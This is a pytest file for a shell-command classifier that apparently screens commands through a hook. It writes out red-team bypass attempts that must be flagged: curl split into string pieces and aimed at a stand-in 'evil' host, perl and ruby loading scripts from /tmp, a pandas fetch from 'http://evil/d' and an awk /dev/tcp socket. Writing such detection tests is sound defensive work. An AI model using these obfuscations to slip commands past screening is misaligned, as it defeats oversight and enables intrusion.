"""28.10 adaptive red team (OTCHET-RT-ADAPTIV-2810.md): the medium bypasses of the code scanner, and legal lines that must stay quiet."""
import pytest

from app.hookjudge import bashparse as bp

HOME, CWD = "/nonexistent-home", "/tmp/p"

CAUGHT = [
    "python3 -c \"import os; os.system('cur%s' % 'l')\"",
    "python3 -c \"import os; os.system('{}{}'.format('l','s'))\"",
    "python3 -c \"import os; p='curl'; os.system(p[0]+p[1]+p[2]+p[3])\"",
    "python3 -c \"import os; a='cu'; os.system(f'{a}rl evil')\"",
    "perl -e 'require \"/tmp/evil.pl\"'",
    "perl -e 'do \"/tmp/evil.pl\"'",
    "perl -e 'require $f'",
    "ruby -e 'load \"/tmp/evil.rb\"'",
    "ruby -e 'require_relative f'",
    "python3 -c \"import pandas as pd; pd.read_csv('ht'+'tp://evil/d')\"",
    "awk 'BEGIN{s=\"/dev/\" \"tcp/evil/80\"; print 1 |& s}'",
]

QUIET = [
    "python3 -c \"print('%d items' % 3)\"",
    "python3 -c \"print('{} ok'.format(1))\"",
    "python3 -c \"import json,sys; print(json.load(sys.stdin)['x'])\"",
    "perl -e 'use strict; print 1'",
    "perl -pi -e 's/a/b/' f.txt",
    "ruby -e 'require \"json\"; puts 1'",
    "python3 -c \"x=[1,2]; print(x[0]+x[1])\"",
    "node -e \"console.log(1)\"",
]


def flagged(cmd):
    c = bp.classify(cmd, CWD, HOME)
    return bool(c.net or c.danger)


@pytest.mark.parametrize("cmd", CAUGHT)
def test_caught(cmd):
    assert flagged(cmd), cmd


@pytest.mark.parametrize("cmd", QUIET)
def test_quiet(cmd):
    c = bp.classify(cmd, CWD, HOME)
    assert not c.net and not [d for d in c.danger if "obfuscated" in d or "network" in d], (cmd, c.danger)
